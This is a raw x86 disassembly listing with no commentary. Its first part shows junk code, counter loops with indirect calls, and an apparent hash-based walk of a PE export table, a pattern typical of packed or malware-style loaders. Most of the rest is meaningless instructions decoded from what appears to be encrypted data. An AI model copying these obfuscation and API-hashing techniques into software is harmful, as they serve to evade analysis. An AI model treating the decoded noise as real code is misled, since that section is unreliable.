  405378:	mov    ecx,DWORD PTR ds:0x429024
  40537e:	dec    ecx
  40537f:	mov    DWORD PTR ds:0x429024,ecx
  405385:	jmp    0x405331
  40538a:	or     DWORD PTR ds:0x42a004,ebx
  405390:	mov    ecx,DWORD PTR [ebp-0x4]
  405393:	xor    ecx,ebx
  405395:	add    ecx,eax
  405397:	sub    esi,0x6631
  40539d:	mov    DWORD PTR [ebp-0x30],ecx
  4053a0:	dec    esi
  4053a1:	mov    esi,DWORD PTR [ebp-0x4]
  4053a4:	and    DWORD PTR ds:0x42d01c,0x0
  4053ae:	jmp    0x4053c2
  4053b3:	xor    ecx,ecx
  4053b5:	or     ecx,DWORD PTR ds:0x42d01c
  4053bb:	inc    ecx
  4053bc:	mov    DWORD PTR ds:0x42d01c,ecx
  4053c2:	cmp    DWORD PTR ds:0x42d01c,0x1e
  4053c9:	jae    0x405407
  4053cf:	cmp    DWORD PTR ds:0x42d01c,0xe
  4053d6:	jne    0x4053e2
  4053dc:	call   DWORD PTR ds:0x42ed51
  4053e2:	cmp    DWORD PTR ds:0x42d01c,0xd
  4053e9:	jne    0x4053fc
  4053ef:	mov    ecx,DWORD PTR ds:0x42d01c
  4053f5:	inc    ecx
  4053f6:	mov    DWORD PTR ds:0x42d01c,ecx
  4053fc:	jmp    0x4053b3
  405401:	or     ecx,DWORD PTR ds:0x42a000
  405407:	xor    esi,ebx
  405409:	dec    ecx
  40540a:	add    esi,eax
  40540c:	mov    ecx,DWORD PTR [ebp-0x24]
  40540f:	and    DWORD PTR ds:0x429000,0x42c018
  405419:	sub    ecx,eax
  40541b:	or     DWORD PTR ds:0x42b014,0x429024
  405425:	lea    edx,[esi-0x3272dd]
  40542b:	add    DWORD PTR ds:0x42d008,0x42a004
  405435:	xor    ecx,ebx
  405437:	adc    DWORD PTR ds:0x42d018,0x3588
  405441:	xor    edx,ebx
  405443:	cmp    edx,ecx
  405445:	je     0x4056db
  40544b:	mov    ecx,DWORD PTR [ebp-0x4]
  40544e:	or     DWORD PTR ds:0x42a004,0x7d41
  405458:	xor    ecx,ebx
  40545a:	sbb    DWORD PTR ds:0x42c004,0x1a4b
  405464:	add    ecx,eax
  405466:	cmp    esi,ecx
  405468:	mov    DWORD PTR ds:0x429018,0x444d
  405472:	jne    0x4056b8
  405478:	and    DWORD PTR ds:0x42b004,0x273e
  405482:	push   DWORD PTR [ebp+0x8]
  405485:	add    DWORD PTR ds:0x42d01c,0x42c004
  40548f:	call   0x404fa3
  405494:	mov    DWORD PTR [ebp-0x18],eax
  405497:	sub    ecx,ecx
  405499:	mov    eax,DWORD PTR [ebp-0x4]
  40549c:	and    DWORD PTR ds:0x42d010,0x0
  4054a6:	jmp    0x4054b8
  4054ab:	mov    edi,DWORD PTR ds:0x42d010
  4054b1:	inc    edi
  4054b2:	mov    DWORD PTR ds:0x42d010,edi
  4054b8:	cmp    DWORD PTR ds:0x42d010,0x1b
  4054bf:	jae    0x40557c
  4054c5:	cmp    DWORD PTR ds:0x42d010,0x10
  4054cc:	jne    0x4054d8
  4054d2:	call   DWORD PTR ds:0x42ed55
  4054d8:	cmp    DWORD PTR ds:0x42d010,0xf
  4054df:	jne    0x4054f2
  4054e5:	mov    edi,DWORD PTR ds:0x42d010
  4054eb:	inc    edi
  4054ec:	mov    DWORD PTR ds:0x42d010,edi
  4054f2:	jmp    0x4054ab
  4054f7:	mov    DWORD PTR ds:0x42c00c,0x1c
  405501:	cmp    DWORD PTR ds:0x42c00c,0x0
  405508:	je     0x40557c
  40550e:	cmp    DWORD PTR ds:0x42c00c,0x4
  405515:	jne    0x405544
  40551b:	push   0x213d
  405520:	push   0x2583
  405525:	push   0x42d000
  40552a:	push   0x5f61
  40552f:	push   0x589a
  405534:	push   0x1da2
  405539:	push   0x4b46
  40553e:	call   DWORD PTR ds:0x42ed59
  405544:	cmp    DWORD PTR ds:0x42c00c,0x5
  40554b:	jne    0x40555e
  405551:	mov    edi,DWORD PTR ds:0x42c00c
  405557:	dec    edi
  405558:	mov    DWORD PTR ds:0x42c00c,edi
  40555e:	xor    edi,edi
  405560:	add    edi,DWORD PTR ds:0x42c00c
  405566:	dec    edi
  405567:	mov    DWORD PTR ds:0x42c00c,edi
  40556d:	jmp    0x405501
  405572:	adc    DWORD PTR ds:0x42c004,0x62a8
  40557c:	mov    ecx,DWORD PTR [ebp-0x18]
  40557f:	dec    edi
  405580:	xor    eax,ebx
  405582:	sub    edi,0x56bd
  405588:	mov    edi,0x3272dd
  40558d:	mov    DWORD PTR ds:0x42d00c,0x2303
  405597:	add    eax,edi
  405599:	mov    DWORD PTR ds:0x42a00c,0x3ae7
  4055a3:	cmp    ecx,eax
  4055a5:	mov    DWORD PTR ds:0x42d018,0x39c7
  4055af:	je     0x407aa3
  4055b5:	add    DWORD PTR ds:0x42b004,0x7234
  4055bf:	push   DWORD PTR [ebp-0x18]
  4055c2:	push   DWORD PTR [ebp+0x8]
  4055c5:	call   0x40cc1e
  4055ca:	mov    ecx,DWORD PTR ds:0x42b01c
  4055d0:	sub    DWORD PTR ds:0x42a010,ecx
  4055d6:	mov    DWORD PTR [ebp-0x18],eax
  4055d9:	mov    eax,DWORD PTR [ebp-0x4]
  4055dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4055df:	mov    DWORD PTR ds:0x429000,0x7fe2
  4055e9:	xor    eax,ebx
  4055eb:	or     DWORD PTR ds:0x42a01c,0x42c010
  4055f5:	add    eax,edi
  4055f7:	mov    DWORD PTR ds:0x42b010,0x7af8
  405601:	cmp    ecx,eax
  405603:	mov    DWORD PTR ds:0x429014,0x1a63
  40560d:	je     0x407aa3
  405613:	mov    eax,ds:0x411f6c
  405618:	mov    ecx,DWORD PTR ds:0x411f84
  40561e:	sub    eax,ecx
  405620:	sub    eax,DWORD PTR [eax+ecx*1]
  405623:	mov    eax,DWORD PTR [ebp-0x18]
  405626:	mov    eax,DWORD PTR [eax+0x18]
  405629:	mov    DWORD PTR [ebp-0x24],eax
  40562c:	and    DWORD PTR ds:0x429028,edi
  405632:	mov    eax,DWORD PTR [ebp-0x18]
  405635:	and    DWORD PTR ds:0x429014,0x0
  40563f:	xor    ecx,ecx
  405641:	xor    ecx,DWORD PTR ds:0x429014
  405647:	inc    ecx
  405648:	mov    DWORD PTR ds:0x429014,ecx
  40564e:	cmp    DWORD PTR ds:0x429014,0xa
  405655:	jne    0x405669
  40565b:	push   DWORD PTR [ebp-0xc]
  40565e:	push   0x42e0a1
  405663:	call   DWORD PTR ds:0x42ed5d
  405669:	cmp    DWORD PTR ds:0x429014,0x9
  405670:	jne    0x405683
  405676:	mov    ecx,DWORD PTR ds:0x429014
  40567c:	inc    ecx
  40567d:	mov    DWORD PTR ds:0x429014,ecx
  405683:	cmp    DWORD PTR ds:0x429014,0x1c
  40568a:	jb     0x40563f
  405690:	mov    ecx,DWORD PTR [ebp+0x8]
  405693:	add    ecx,DWORD PTR [eax+0x20]
  405696:	mov    DWORD PTR [ebp-0x2c],ecx
  405699:	mov    eax,DWORD PTR [ebp-0x18]
  40569c:	mov    ecx,DWORD PTR [ebp+0x8]
  40569f:	add    ecx,DWORD PTR [eax+0x24]
  4056a2:	mov    DWORD PTR [ebp-0x34],ecx
  4056a5:	mov    eax,DWORD PTR [ebp-0x18]
  4056a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4056ab:	add    ecx,DWORD PTR [eax+0x1c]
  4056ae:	mov    eax,edi
  4056b0:	mov    DWORD PTR [ebp-0x18],ecx
  4056b3:	jmp    0x407a6b
  4056b8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4056bb:	mov    edx,DWORD PTR [ebp+0x8]
  4056be:	add    edx,DWORD PTR [ecx+esi*4]
  4056c1:	mov    DWORD PTR [ebp-0x28],edx
  4056c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056c7:	mov    edx,DWORD PTR [ebp-0x28]
  4056ca:	xor    ecx,ebx
  4056cc:	add    ecx,eax
  4056ce:	cmp    edx,ecx
  4056d0:	je     0x407a6b
  4056d6:	jmp    0x407a57
  4056db:	mov    ecx,DWORD PTR [ebp-0x4]
  4056de:	mov    edx,DWORD PTR [ebp-0x8]
  4056e1:	xor    ecx,ebx
  4056e3:	add    ecx,eax
  4056e5:	cmp    edx,ecx
  4056e7:	je     0x407aaf
  4056ed:	jmp    0x407a45
  4056f2:	or     al,0xd7
  4056f4:	xchg   ebp,eax
  4056f5:	loop   0x40576c
  4056f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f8:	emms   
  4056fa:	adc    dl,BYTE PTR ds:0xd88bf58a
  405700:	jb     0x405768
  405702:	xlat   BYTE PTR ds:[ebx]
  405703:	pop    edi
  405704:	jp     0x405780
  405706:	aaa    
  405707:	pop    edi
  405708:	jp     0x405784
  40570a:	popa   
  40570b:	(bad)  
  40570d:	jo     0x40571d
  40570f:	jne    0x405721
  405711:	(bad)  
  405712:	int3   
  405713:	aam    0x43
  405715:	mov    gs:0x10cca7d7,al
  40571b:	xchg   ecx,eax
  40571c:	mov    ebx,0xd893886f
  405721:	daa    
  405722:	and    esp,esp
  405724:	jmp    0xbdcb:0x4c557193
  40572b:	aam    0x63
  40572d:	pop    ecx
  40572e:	scas   al,BYTE PTR es:[edi]
  40572f:	pop    es
  405730:	test   BYTE PTR [esi-0x79080119],ch
  405736:	mov    al,ds:0x21dea0fa
  40573b:	jae    0x40576c
  40573d:	and    bh,ch
  40573f:	js     0x405718
  405741:	popa   
  405742:	mov    esi,0x2fb543f8
  405747:	clc    
  405748:	ror    DWORD PTR [ecx-0x1e],1
  40574b:	ja     0x405709
  40574d:	mov    al,BYTE PTR [ebp-0x7]
  405750:	xchg   DWORD PTR [esi-0x2f],eax
  405753:	xchg   edx,eax
  405754:	xor    BYTE PTR [eax-0x54987395],dl
  40575a:	xchg   esi,eax
  40575b:	or     cl,BYTE PTR [edx-0x40]
  40575e:	out    dx,eax
  40575f:	push   eax
  405760:	mov    esp,0xad597cb4
  405765:	push   ss
  405766:	jne    0x40571c
  405768:	push   ss
  405769:	lock xchg edx,eax
  40576b:	por    mm2,QWORD PTR [ebx+0x61ccee2]
  405772:	xlat   BYTE PTR ds:[ebx]
  405773:	push   edi
  405774:	das    
  405775:	repnz mul ah
  405778:	loope  0x40574d
  40577a:	cwde   
  40577b:	imul   esi,esp,0x98f40c47
  405781:	shl    DWORD PTR [eax+0x13],cl
  405784:	fs in  eax,dx
  405786:	call   0xbcd873bf
  40578b:	adc    DWORD PTR [ecx],esp
  40578d:	leave  
  40578e:	sbb    BYTE PTR [ecx-0x3a],bl
  405791:	leave  
  405792:	(bad)  
  405793:	in     al,dx
  405794:	dec    eax
  405795:	mov    ah,0xc0
  405797:	jl     0x4057fd
  405799:	jecxz  0x40571c
  40579b:	cmp    eax,0x1016da02
  4057a0:	mov    esi,0x2e23b96e
  4057a5:	add    DWORD PTR [esi+0x25],eax
  4057a8:	mov    edx,0x8815c731
  4057ad:	(bad)  
  4057ae:	arpl   WORD PTR [edi-0x1e2a72a0],bx
  4057b4:	leave  
  4057b5:	ds xchg edx,eax
  4057b7:	jmp    0x785bd31a
  4057bc:	pop    edx
  4057bd:	mov    eax,ds:0x8c780667
  4057c2:	data16 fdivr DWORD PTR [ebp+eax*2+0x235b0c34]
  4057ca:	daa    
  4057cb:	in     al,dx
  4057cc:	inc    DWORD PTR [ebx+0x2e]
  4057cf:	ficom  WORD PTR [eax-0x5f]
  4057d2:	ins    DWORD PTR es:[edi],dx
  4057d3:	mov    edx,0xe2911524
  4057d8:	scas   al,BYTE PTR es:[edi]
  4057d9:	fnstenv ds:0x34724fb0
  4057df:	int3   
  4057e0:	test   eax,0x47fde2a2
  4057e5:	pop    ss
  4057e6:	in     al,dx
  4057e7:	adc    DWORD PTR [edi-0x67858b9e],eax
  4057ed:	push   ss
  4057ee:	(bad)  
  4057ef:	je     0x405782
  4057f1:	mov    DWORD PTR [ebp+0x4e],edi
  4057f4:	jg     0x4057ea
  4057f6:	pusha  
  4057f7:	fst    DWORD PTR [esi+0x34]
  4057fa:	cmp    al,0x9d
  4057fc:	mul    BYTE PTR [ebx-0x65]
  4057ff:	imul   ecx,eax,0x744eca59
  405805:	outs   dx,DWORD PTR ds:[esi]
  405806:	call   0xf250:0xab6a14f6
  40580d:	ret    
  40580e:	imul   eax,edi,0x34
  405811:	mov    ds:0x41af5f76,al
  405816:	push   ebp
  405817:	dec    ebx
  405818:	enter  0xde16,0x36
  40581c:	or     ecx,DWORD PTR [ecx-0x5e]
  40581f:	adc    DWORD PTR [ecx+0x1e646ba9],0x871a23df
  405829:	push   esp
  40582a:	out    0x86,eax
  40582c:	xor    BYTE PTR [ecx-0x2d],ch
  40582f:	jl     0x40582e
  405831:	sbb    eax,0xa64e9fcc
  405836:	sbb    DWORD PTR [ebp-0x62],0x68ac50d1
  40583d:	mov    bh,0x42
  40583f:	aaa    
  405840:	jg     0x405835
  405842:	and    ecx,DWORD PTR [ebx]
  405844:	out    dx,eax
  405845:	jmp    0x10a:0xbb26f8fb
  40584c:	sbb    BYTE PTR [edi+0x41],bl
  40584f:	jle    0x405870
  405851:	sahf   
  405852:	mov    al,ds:0x77f737bd
  405857:	cwde   
  405858:	push   edx
  405859:	xchg   ebp,eax
  40585a:	iret   
  40585b:	ret    0x979d
  40585e:	add    al,0x34
  405860:	test   BYTE PTR [ecx+edx*4+0x3c],cl
  405864:	daa    
  405865:	dec    edi
  405866:	xor    BYTE PTR [ebx-0x2c332b41],0x3b
  40586d:	int    0x6b
  40586f:	mov    edi,0x4105a36e
  405874:	pop    ebp
  405875:	ins    BYTE PTR es:[edi],dx
  405876:	outs   dx,DWORD PTR ds:[esi]
  405877:	hlt    
  405878:	mov    cl,0x4a
  40587a:	aam    0xb7
  40587c:	pop    eax
  40587d:	pushf  
  40587e:	sub    eax,0xfa6cac39
  405883:	mov    esp,0x1d7623e0
  405888:	cmp    BYTE PTR [ebx-0x28],0x19
  40588c:	aas    
  40588d:	inc    esi
  40588e:	scas   al,BYTE PTR es:[edi]
  40588f:	inc    edi
  405890:	jmp    0x405878
  405892:	xchg   esp,eax
  405893:	imul   ebp,DWORD PTR [ebx-0x65],0x650ac251
  40589a:	hlt    
  40589b:	out    0x9a,al
  40589d:	int3   
  40589e:	pop    edx
  40589f:	dec    edi
  4058a0:	inc    esi
  4058a1:	test   ch,bh
  4058a3:	adc    esp,esi
  4058a5:	or     dl,bl
  4058a7:	call   0x52c1:0x93138de7
  4058ae:	mov    ch,0x44
  4058b0:	dec    esi
  4058b1:	and    al,0x2f
  4058b3:	das    
  4058b4:	sub    edi,ebx
  4058b6:	jp     0x405915
  4058b8:	nop
  4058b9:	xor    esp,DWORD PTR [edx]
  4058bb:	cdq    
  4058bc:	mov    eax,0xc4830a05
  4058c1:	sbb    al,0xd7
  4058c3:	push   esi
  4058c4:	mov    eax,ds:0xd7a39996
  4058c9:	pop    ss
  4058ca:	adc    ecx,esi
  4058cc:	pusha  
  4058cd:	imul   ebp,DWORD PTR [edi],0x98cbe46c
  4058d3:	jae    0x4058f9
  4058d5:	pop    ebx
  4058d6:	push   ecx
  4058d7:	test   BYTE PTR [edx+0x7ddabfd3],al
  4058dd:	fwait
  4058de:	cmc    
  4058df:	mov    edx,edx
  4058e1:	mov    ds:0x24208b01,al
  4058e6:	fnsave [esi]
  4058e8:	stos   DWORD PTR es:[edi],eax
  4058e9:	arpl   WORD PTR [eax+ebx*1],dx
  4058ec:	push   ebx
  4058ed:	xor    DWORD PTR fs:[ebx],edx
  4058f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f1:	sbb    bh,bh
  4058f3:	mov    al,ds:0xcd0b39bf
  4058f8:	iret   
  4058f9:	cli    
  4058fa:	or     eax,ebp
  4058fc:	jae    0x405904
  4058fe:	adc    al,0x9d
  405900:	mov    edi,0x10bea5a2
  405905:	xchg   edx,eax
  405906:	mov    edx,DWORD PTR [esi+ebx*2-0x243674a6]
  40590d:	in     eax,0xea
  40590f:	adc    eax,0xeb7bc3b9
  405914:	les    ebp,FWORD PTR [ebp-0x74]
  405917:	inc    esp
  405918:	clc    
  405919:	fldenv [ebp+0x2d]
  40591c:	xor    BYTE PTR [esi-0x5e2ea7df],ah
  405922:	xor    eax,0x3570e932
  405927:	push   0x2cf1ed57
  40592c:	inc    edx
  40592d:	popf   
  40592e:	pop    ebp
  40592f:	adc    DWORD PTR [ebx],esp
  405931:	fistp  DWORD PTR [ebp-0x36590c56]
  405937:	mov    al,ds:0xdb4c9236
  40593c:	retf   0xa65f
  40593f:	push   0x16
  405941:	fcmovu st,st(3)
  405943:	pusha  
  405944:	cmp    edx,ecx
  405946:	sub    DWORD PTR [ebx+0x7],0xb1d29f60
  40594d:	shl    al,1
  40594f:	and    BYTE PTR [edx+0x6c98a188],ah
  405955:	nop
  405956:	mov    al,ds:0x7ba452e
  40595b:	jne    0x4059ad
  40595d:	inc    esp
  40595e:	sbb    eax,0x769b3940
  405963:	jb     0x405920
  405965:	sub    edx,DWORD PTR [esp+edi*8+0x3cf66d1e]
  40596c:	adc    eax,0x288cf26a
  405971:	lahf   
  405972:	mov    fs:0x162eff6d,al
  405978:	jmp    0x68ff6f26
  40597d:	das    
  40597e:	fisttp WORD PTR [ebp-0x67]
  405981:	jns    0x405988
  405983:	jns    0x40593e
  405985:	ja     0x40593a
  405987:	sti    
  405988:	dec    eax
  405989:	pop    edx
  40598a:	or     al,0x9b
  40598c:	lods   al,BYTE PTR ds:[esi]
  40598d:	(bad)
  405990:	mov    ecx,ebp
  405992:	sbb    BYTE PTR [esi+0x71],bh
  405995:	fs dec eax
  405997:	aad    0xea
  405999:	xchg   edx,eax
  40599a:	sar    BYTE PTR [eax],0x93
  40599d:	mov    ebp,0xa80e45d7
  4059a2:	(bad)  
  4059a3:	ror    DWORD PTR [edx-0x30],cl
  4059a6:	add    ebp,0xffffffdb
  4059a9:	sbb    eax,0xda749409
  4059ae:	push   ebp
  4059af:	ret    
  4059b0:	in     al,0x5e
  4059b2:	dec    esi
  4059b3:	enter  0xc7fd,0xae
  4059b7:	pop    ebx
  4059b8:	sub    BYTE PTR [eax],ch
  4059ba:	mov    dh,0x59
  4059bc:	loope  0x405946
  4059be:	jns    0x40599a
  4059c0:	stos   BYTE PTR es:[edi],al
  4059c1:	sbb    ah,dl
  4059c3:	pop    eax
  4059c4:	(bad)  
  4059c6:	xchg   edi,eax
  4059c7:	mov    ecx,0x8a925e3a
  4059cc:	in     al,dx
  4059cd:	daa    
  4059ce:	out    dx,eax
  4059cf:	mov    esi,0x98553119
  4059d4:	pop    ecx
  4059d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d6:	pop    ebx
  4059d7:	aas    
  4059d8:	cmp    eax,0x845387d3
  4059dd:	inc    ebp
  4059de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059df:	jo     0x40599a
  4059e1:	mov    BYTE PTR [ebp+0x6e],bl
  4059e4:	or     BYTE PTR [edi-0x5b],ch
  4059e7:	jge    0x405a0d
  4059e9:	adc    cl,bh
  4059eb:	mov    ds:0x33c95b13,al
  4059f0:	xor    DWORD PTR [ebx],edi
  4059f2:	jl     0x4059ff
  4059f4:	rcl    BYTE PTR [eax+0x54],0x60
  4059f8:	push   esp
  4059f9:	inc    ecx
  4059fa:	(bad)  
  4059fb:	mov    esp,0x2c379628
  405a00:	(bad)  
  405a01:	loop   0x405a12
  405a03:	(bad)  
  405a04:	imul   ebp,DWORD PTR [ecx-0x7f163d59],0xf8a40a5e
  405a0e:	lods   eax,DWORD PTR ds:[esi]
  405a0f:	mul    BYTE PTR [edi]
  405a11:	cmp    DWORD PTR ds:0xd316e47,ecx
  405a17:	call   0x9727:0x62605afe
  405a1e:	jp     0x405a84
  405a20:	xchg   esp,eax
  405a21:	mov    bl,0xf
  405a23:	stos   BYTE PTR es:[edi],al
  405a24:	mov    ch,0xa2
  405a26:	lods   al,BYTE PTR ds:[esi]
  405a27:	sbb    edi,DWORD PTR [eax-0x26fc1385]
  405a2d:	iret   
  405a2e:	js     0x405a83
  405a30:	pop    ds
  405a31:	xchg   ecx,eax
  405a32:	sub    DWORD PTR ds:0x942a046,ecx
  405a38:	(bad)  
  405a39:	ss dec edx
  405a3b:	cmp    dh,BYTE PTR [eax-0x24]
  405a3e:	and    BYTE PTR [edx+0x47],cl
  405a41:	scas   al,BYTE PTR es:[edi]
  405a42:	jge    0x405a76
  405a44:	or     DWORD PTR [ebx-0x3e69605a],0xffffffec
  405a4b:	pop    ss
  405a4c:	jne    0x405a53
  405a4e:	push   esp
  405a4f:	imul   edx,DWORD PTR [edi+0x763a11a1],0x962d6065
  405a59:	es aam 0x67
  405a5c:	mov    ebx,0xb0eb1f1d
  405a61:	mov    dh,0x20
  405a63:	or     dl,bl
  405a65:	push   ebx
  405a66:	sahf   
  405a67:	adc    BYTE PTR [esi-0x80],0x31
  405a6b:	cmp    eax,0xd45e8e85
  405a70:	adc    BYTE PTR [ecx-0x1f],bh
  405a73:	inc    BYTE PTR ds:0xe38ca95a
  405a79:	icebp  
  405a7a:	ficom  WORD PTR [esi+edi*4-0x42c0713d]
  405a81:	les    esp,FWORD PTR [edi-0x7f34916b]
  405a87:	mov    WORD PTR [ebp-0x3943eeec],gs
  405a8d:	lahf   
  405a8e:	dec    esi
  405a8f:	daa    
  405a90:	sbb    DWORD PTR [esi-0x77],ebp
  405a93:	dec    ebp
  405a94:	popf   
  405a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a96:	int    0x1a
  405a98:	and    ecx,ebp
  405a9a:	add    al,0x50
  405a9c:	push   esi
  405a9d:	inc    ecx
  405a9e:	push   ds
  405a9f:	into   
  405aa0:	loop   0x405a87
  405aa2:	popa   
  405aa3:	shl    BYTE PTR [edx-0x12c3faf4],1
  405aa9:	mov    edi,0x37412
  405aae:	mov    ch,0x41
  405ab0:	outs   dx,DWORD PTR gs:[esi]
  405ab2:	pop    eax
  405ab3:	test   BYTE PTR [eax+0x1de35a91],ch
  405ab9:	sub    cl,BYTE PTR [esi]
  405abb:	or     eax,0x162211b
  405ac0:	pop    ecx
  405ac1:	jmp    0x405b1e
  405ac3:	mov    ch,0xef
  405ac5:	or     DWORD PTR [edi+0x27],eax
  405ac8:	call   0x7ee5a97c
  405acd:	ins    DWORD PTR es:[edi],dx
  405ace:	sub    eax,0xd65e4427
  405ad3:	retf   0x5bd6
  405ad6:	mov    ebp,0xbb1fe005
  405adb:	mov    sp,0xb321
  405adf:	xchg   esp,ecx
  405ae1:	sahf   
  405ae2:	sti    
  405ae3:	pop    ebx
  405ae4:	data16 and BYTE PTR [bx-0x1fde],cl
  405aea:	test   DWORD PTR [edi+0x69],esi
  405aed:	sub    BYTE PTR [esi],al
  405aef:	arpl   WORD PTR [ebx],di
  405af1:	sbb    bh,BYTE PTR [edx]
  405af3:	xchg   edx,eax
  405af4:	outs   dx,DWORD PTR ds:[esi]
  405af5:	jne    0x405a98
  405af7:	mov    bh,0xac
  405af9:	inc    ebp
  405afa:	jge    0x405aaf
  405afc:	std    
  405afd:	sbb    ecx,DWORD PTR [ecx-0x5e]
  405b00:	mov    cl,0xac
  405b02:	cmp    esi,esi
  405b04:	inc    ebx
  405b05:	pop    esp
  405b06:	repz shr BYTE PTR [edx+0x5e],1
  405b0a:	push   0x54
  405b0c:	sahf   
  405b0d:	cmp    edx,edi
  405b0f:	js     0x405b5d
  405b11:	scas   eax,DWORD PTR es:[edi]
  405b12:	dec    esp
  405b13:	(bad)  
  405b16:	sbb    DWORD PTR [ecx+edi*8],esp
  405b19:	xchg   ebx,eax
  405b1a:	jmp    0x405b7f
  405b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1d:	(bad)  
  405b1e:	or     DWORD PTR [esi],edx
  405b20:	test   al,0x22
  405b22:	sar    al,cl
  405b24:	fdivr  DWORD PTR [edx+ecx*8-0x5a6573df]
  405b2b:	dec    esi
  405b2c:	sbb    dl,ah
  405b2e:	cmc    
  405b2f:	sbb    cl,BYTE PTR [ecx]
  405b31:	loopne 0x405b80
  405b33:	dec    edx
  405b34:	dec    eax
  405b35:	push   ecx
  405b36:	push   ds
  405b37:	daa    
  405b38:	fstp   TBYTE PTR [ebx-0x5]
  405b3b:	sbb    BYTE PTR [edx+0x1c37a9c0],bl
  405b41:	mov    ah,0x43
  405b43:	or     eax,0x989b63f8
  405b48:	imul   esi,DWORD PTR [ecx],0x4b
  405b4b:	and    esi,DWORD PTR [edx-0x57be0559]
  405b51:	cmp    DWORD PTR [ecx+0x48],edi
  405b54:	ror    DWORD PTR [esi+ecx*8],1
  405b57:	aad    0x73
  405b59:	call   0xe72ef951
  405b5e:	cmp    DWORD PTR [ecx],esi
  405b60:	jnp    0x405b62
  405b62:	retf   0x87d7
  405b65:	cmp    eax,0x2e45580f
  405b6a:	and    eax,ecx
  405b6c:	scas   eax,DWORD PTR es:[edi]
  405b6d:	addr16 mov eax,ds:0x125a
  405b71:	mov    edi,0x4d4ae394
  405b76:	dec    esp
  405b77:	sub    DWORD PTR [ebp-0x89220db],ebp
  405b7d:	sbb    esp,ebp
  405b7f:	nop
  405b80:	call   0xd8ebde6d
  405b85:	push   DWORD PTR [ebx]
  405b87:	jl     0x405bc6
  405b89:	push   esp
  405b8a:	xor    ecx,DWORD PTR [esp+ebx*1-0x70]
  405b8e:	fist   WORD PTR [edx-0x1f56d523]
  405b94:	inc    esi
  405b95:	ja     0x405b19
  405b97:	bound  ebx,QWORD PTR [edi-0x50ea824c]
  405b9d:	mov    esp,0xbfb866ed
  405ba2:	or     DWORD PTR [edi],0xca6d968d
  405ba8:	xchg   esp,eax
  405ba9:	mov    BYTE PTR [ebp-0x4f],dh
  405bac:	sar    BYTE PTR [ebx-0x7d],1
  405baf:	push   ebx
  405bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bb1:	in     al,dx
  405bb2:	data16 ins BYTE PTR es:[edi],dx
  405bb4:	gs in  al,dx
  405bb6:	mov    ah,0x13
  405bb8:	jb     0x405c30
  405bba:	mov    cl,0x68
  405bbc:	xor    eax,0x6ba930cd
  405bc1:	ret    
  405bc2:	or     eax,0x7237633
  405bc7:	(bad)  [ebp+0x4940c610]
  405bcd:	pop    esi
  405bce:	push   0xe
  405bd0:	xor    eax,0xffffff92
  405bd3:	xor    BYTE PTR [esi],bh
  405bd5:	icebp  
  405bd6:	mov    ebx,0x37d49483
  405bdb:	add    ah,dl
  405bdd:	dec    ebx
  405bde:	cmp    eax,0x89269303
  405be3:	push   eax
  405be4:	push   ebp
  405be5:	retf   0xcdfa
  405be8:	push   ss
  405be9:	xchg   esi,eax
  405bea:	es mov dh,0x56
  405bed:	mov    esi,0xe6d730cb
  405bf2:	pop    esp
  405bf3:	push   0xd817d4c8
  405bf8:	mov    al,0x2d
  405bfa:	jg     0x405bf2
  405bfc:	jmp    0x405be8
  405bfe:	mov    ah,0x43
  405c00:	mov    BYTE PTR [ebp-0x68],0xce
  405c04:	dec    edi
  405c05:	shl    DWORD PTR [ecx],1
  405c07:	and    DWORD PTR [ecx+0x1508c404],0x386cc4bf
  405c11:	and    ecx,DWORD PTR [esi+0xd527a86]
  405c17:	(bad)  
  405c18:	pop    edx
  405c19:	sbb    edx,DWORD PTR ds:0x6f806fe6
  405c1f:	xlat   BYTE PTR ds:[ebx]
  405c20:	popf   
  405c21:	sub    eax,0xe08afda9
  405c26:	and    esp,edi
  405c28:	aaa    
  405c29:	sbb    ecx,edi
  405c2b:	hlt    
  405c2c:	loope  0x405ca7
  405c2e:	push   esp
  405c2f:	js     0x405c51
  405c31:	mov    DWORD PTR [eax],esp
  405c33:	stos   DWORD PTR es:[edi],eax
  405c34:	(bad)  
  405c35:	push   ebp
  405c36:	mov    ch,0x76
  405c38:	imul   edi,DWORD PTR [edi-0x356c3d16],0x936f9c56
  405c42:	aad    0x69
  405c44:	push   cs
  405c45:	pusha  
  405c46:	mov    eax,0x78f9c691
  405c4b:	jbe    0x405c96
  405c4d:	xlat   BYTE PTR ds:[ebx]
  405c4e:	fdiv   DWORD PTR [ebx-0xb1d6f11]
  405c54:	pop    ebx
  405c55:	sbb    edx,ebp
  405c57:	pop    eax
  405c58:	adc    eax,0x224491ca
  405c5d:	retf   0x1d1b
  405c60:	fdecstp 
  405c62:	stos   BYTE PTR es:[edi],al
  405c63:	fmul   st,st(4)
  405c65:	or     BYTE PTR [ebx+0x32a4a9c7],dh
  405c6b:	jb     0x405ca1
  405c6d:	psrlq  mm7,mm1
  405c70:	add    BYTE PTR [edx+0x2d094596],ah
  405c76:	sub    BYTE PTR [edx],bl
  405c78:	push   0x5378736b
  405c7d:	cmp    BYTE PTR [ebx+0x1ef0c496],dl
  405c83:	xchg   esp,eax
  405c84:	pop    ds
  405c85:	mov    WORD PTR [esi-0x61],cs
  405c88:	sahf   
  405c89:	pop    esi
  405c8a:	out    dx,eax
  405c8b:	rol    BYTE PTR [ebx-0x7c310633],1
  405c91:	icebp  
  405c92:	imul   ebp,edi,0x10
  405c95:	adc    BYTE PTR [ebx],0x9f
  405c98:	inc    ecx
  405c99:	pop    edx
  405c9a:	sub    edx,DWORD PTR [esp+edx*8-0x63]
  405c9e:	fmul   st,st(6)
  405ca0:	mov    al,ds:0x7490b2e
  405ca5:	int3   
  405ca6:	mov    ecx,0xb7ea6d3d
  405cab:	xor    DWORD PTR [edi],edi
  405cad:	push   cs
  405cae:	scas   eax,DWORD PTR es:[edi]
  405caf:	inc    edi
  405cb0:	add    eax,0xb93272aa
  405cb5:	test   eax,0xbd9f4115
  405cba:	adc    eax,0x4c00bf50
